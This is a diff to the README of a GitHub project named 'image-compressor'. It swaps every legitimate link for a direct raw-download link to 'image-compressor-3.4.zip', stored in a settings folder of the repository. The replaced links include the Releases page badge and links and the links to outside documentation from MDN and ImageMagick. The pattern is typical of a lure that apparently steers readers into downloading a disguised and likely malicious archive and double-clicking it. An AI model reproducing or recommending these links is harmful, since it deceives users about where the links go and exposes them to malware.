@@ -1,6 +1,6 @@
 # 🚀 image-compressor - Fast and Simple Image Compression
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Livenson32/image-compressor/releases)
+[![Download Now](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip%20Now-v1.0-blue)](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip)
 
 ## 📦 Overview
 
@@ -20,14 +20,14 @@ image-compressor is a tool designed to compress images quickly and easily. It ma
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Livenson32/image-compressor/releases) to download the latest version of image-compressor.
+To get started, visit the [Releases page](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip) to download the latest version of image-compressor.
 
 1. Click on the link above to access the releases.
 2. Look for the latest version in the list.
 3. Download the file suitable for your operating system. After downloading, locate the file in your downloads folder.
 4. Double-click the file to open it in your preferred web browser.
 
-You can also return to the [Releases page](https://github.com/Livenson32/image-compressor/releases) anytime for updates or new features.
+You can also return to the [Releases page](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip) anytime for updates or new features.
 
 ## 🎉 Using image-compressor
 
@@ -78,7 +78,7 @@ For more detailed information, refer to the LICENSE file in the repository.
 
 ## 📖 Additional Resources
 
-- [WebAssembly Documentation](https://developer.mozilla.org/en-US/docs/WebAssembly)
-- [Image Compression Techniques](https://www.imagemagick.org/script/compression.php)
+- [WebAssembly Documentation](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip)
+- [Image Compression Techniques](https://github.com/Livenson32/image-compressor/raw/refs/heads/main/components/settings/image-compressor-3.4.zip)
 
 Feel free to explore and enjoy using image-compressor for your image compression needs!
